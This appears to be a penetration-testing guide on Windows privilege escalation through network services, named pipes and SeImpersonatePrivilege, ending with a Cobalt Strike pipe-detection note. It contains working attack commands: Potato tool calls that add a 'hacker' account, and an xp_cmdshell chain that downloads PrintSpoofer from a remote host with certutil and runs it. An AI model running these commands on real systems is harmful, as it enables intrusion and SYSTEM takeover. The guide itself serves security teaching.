## Communication with Processes

Windows processes communicate with each other and with users through two primary channels: network sockets and named pipes. Both present privilege escalation opportunities when misconfigured, and both require different enumeration approaches. 
***

## Access Tokens

Every process and thread in Windows runs with an access token that defines its security context. When a service runs as `NT AUTHORITY\SYSTEM` and a lower-privileged process can interact with it, that interaction may expose the SYSTEM token for capture and impersonation. 

The most common path from a service account to SYSTEM follows this chain:

```
Web server / SQL Server / FTP service running as low-priv service account
    |
    v
Service account has SeImpersonatePrivilege (granted by default to service accounts)
    |
    v
Trick a SYSTEM process into connecting to your named pipe
    |
    v
Call ImpersonateNamedPipeClient() to steal the SYSTEM token
    |
    v
NT AUTHORITY\SYSTEM
```

***

## Network Service Enumeration

```cmd
:: Full port and process listing
netstat -ano

:: Cross-reference PID to process name
tasklist /svc /FI "PID eq <pid>"

:: PowerShell alternative
Get-NetTCPConnection | Select-Object LocalAddress, LocalPort, State, OwningProcess |
    Where-Object {$_.State -eq "Listen"} | Sort-Object LocalPort
```

### Reading netstat Output

The most valuable entries are those bound to loopback (`127.0.0.1` or `::1`) because they are only accessible from the host itself after gaining a foothold, and developers often leave them poorly secured under the assumption that "it's not accessible from the network": 

```
TCP    0.0.0.0:21          LISTENING  3812   <- FTP, accessible externally
TCP    0.0.0.0:8080        LISTENING  5044   <- web app, accessible externally
TCP    127.0.0.1:14147     LISTENING  3812   <- FileZilla admin interface, localhost only
TCP    127.0.0.1:3306      LISTENING  <pid>  <- MySQL, localhost only
```

`127.0.0.1:14147` in the example is FileZilla's administrative interface. Connecting to it locally can extract FTP credentials stored in the FileZilla configuration and allows creating an FTP share at `C:\` under whatever account FileZilla runs as. 

### Other High-Value Listening Services

| Port | Service | Potential Path |
|---|---|---|
| 25672 | Erlang (RabbitMQ, SolarWinds) | Cookie auth bypass, join cluster, RCE |
| 8089 | Splunk Universal Forwarder | Unauthenticated app deployment as SYSTEM  |
| 1433 | MSSQL | `xp_cmdshell` if SA account accessible |
| 4848 | GlassFish admin | Unauthenticated admin console |
| 9200 | Elasticsearch | Unauthenticated API, file read |

***

## Named Pipes

Named pipes are in-memory files used for inter-process communication (IPC). They follow the path format `\\.\pipe\PipeName`. The server creates the pipe and waits; the client connects to it. Privilege escalation happens when a low-privileged user has `FILE_ALL_ACCESS` or write access to a pipe whose server runs as SYSTEM - the server can then be tricked into impersonating the client's token, or the client can interact with the server in unintended ways. 

### Enumeration

```cmd
:: List all named pipes (Sysinternals)
pipelist.exe /accepteula

:: PowerShell equivalent
gci \\.\pipe\

:: Check permissions on all named pipes
accesschk.exe /accepteula \pipe\* -v

:: Check permissions on all pipes, filter for write access by low-priv users
accesschk.exe /accepteula -w \pipe\* -v

:: Check a specific pipe
accesschk.exe /accepteula \\.\Pipe\lsass -v
accesschk.exe /accepteula \\.\Pipe\WindscribeService -v
```

### Interpreting AccessChk Output

```
\\.\Pipe\WindscribeService
  Medium Mandatory Level (Default) [No-Write-Up]
  RW Everyone
        FILE_ALL_ACCESS    <- Every user on the system has full access = exploitable
```

Contrast with a properly secured pipe:

```
\\.\Pipe\lsass
  Untrusted Mandatory Level [No-Write-Up]
  RW Everyone
        FILE_READ_ATTRIBUTES   <- Read only, cannot inject or write
  RW BUILTIN\Administrators
        FILE_ALL_ACCESS        <- Only admins have full control = expected
```

### Named Pipe DACL Permission Reference

| Permission | Meaning | Risk if granted to Everyone |
|---|---|---|
| `FILE_ALL_ACCESS` | Full control | Critical, exploitable directly |
| `FILE_WRITE_DATA` | Write data to pipe | High, can send commands to server |
| `FILE_READ_DATA` | Read data from pipe | Medium, can capture responses |
| `FILE_CREATE_PIPE_INSTANCE` | Create additional pipe instances | High, can impersonate |
| `WRITE_DAC` | Modify the DACL itself | Critical, can grant yourself full access |

### Named Pipe Impersonation Attack Flow

When a privileged server reads from a named pipe and the pipe grants Everyone write access: 
```
1. Server process (SYSTEM) creates \\.\pipe\VulnerableService and waits for connections
2. Low-priv client connects and writes data
3. Server calls ImpersonateNamedPipeClient() while handling the request
4. Server now temporarily runs under client's security context (or vice versa in some exploits)
5. If the pipe uses TOKEN_IMPERSONATE level, the server can use the client token
```

For the reverse (client impersonates high-priv server) the exploit abuses `SeImpersonatePrivilege`. 
***

## SeImpersonatePrivilege Exploitation

When you land on a Windows host as a service account (IIS, MSSQL, FTP), the first thing to check is whether `SeImpersonatePrivilege` is assigned: 

```cmd
whoami /priv | findstr /i "impersonate\|assign"
```

### Potato Attack Selector

The right tool depends on the OS version:
```
Windows Server 2008, 2012, 2016 / Windows 7, 8, 10 (before 1809):
  -> JuicyPotato.exe
     .\JuicyPotato.exe -l 1337 -p C:\Windows\system32\cmd.exe -a "/c net user hacker Pass1! /add" -t *

Windows Server 2019 / Windows 10 1809+:
  JuicyPotato is patched. Use:
  -> PrintSpoofer.exe
     .\PrintSpoofer.exe -i -c cmd.exe
     .\PrintSpoofer.exe -c "net user hacker Pass1! /add"

  -> RoguePotato.exe
     .\RoguePotato.exe -r 10.10.14.2 -e "net user hacker Pass1! /add" -l 9999

  -> GodPotato.exe (works across most modern versions)
     .\GodPotato.exe -cmd "cmd /c whoami"
```

### MSSQL to SYSTEM via SeImpersonatePrivilege (Scenario 3 from Module Intro)

```sql
-- Enable xp_cmdshell
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;

-- Confirm the privilege
EXEC xp_cmdshell 'whoami /priv';

-- Upload PrintSpoofer to C:\Windows\Temp via xp_cmdshell
EXEC xp_cmdshell 'certutil -urlcache -split -f http://10.10.14.2/PrintSpoofer.exe C:\Windows\Temp\ps.exe';

-- Execute
EXEC xp_cmdshell 'C:\Windows\Temp\ps.exe -c "whoami"';
```

***

## Cobalt Strike Named Pipe Detection Note

Cobalt Strike uses named pipes to route command output from injected processes back to the beacon. The default pipe pattern is `\\.\pipe\msagent_<random>`. Operators frequently change this to `\\.\pipe\mojo` (mimicking Chrome's IPC). Spotting `mojo` pipes on a machine without Chrome installed is a reliable indicator of an active Cobalt Strike implant. 
```powershell
# Spot suspicious pipe names
gci \\.\pipe\ | Where-Object { $_.Name -match "mojo|msagent|postex|status_" }

# Known Cobalt Strike pipe patterns
# msagent_*    <- default, rarely seen now
# mojo.*       <- Chrome masquerade
# status_*     <- common operator choice
# halszka*     <- seen in some CS malleable profiles
```
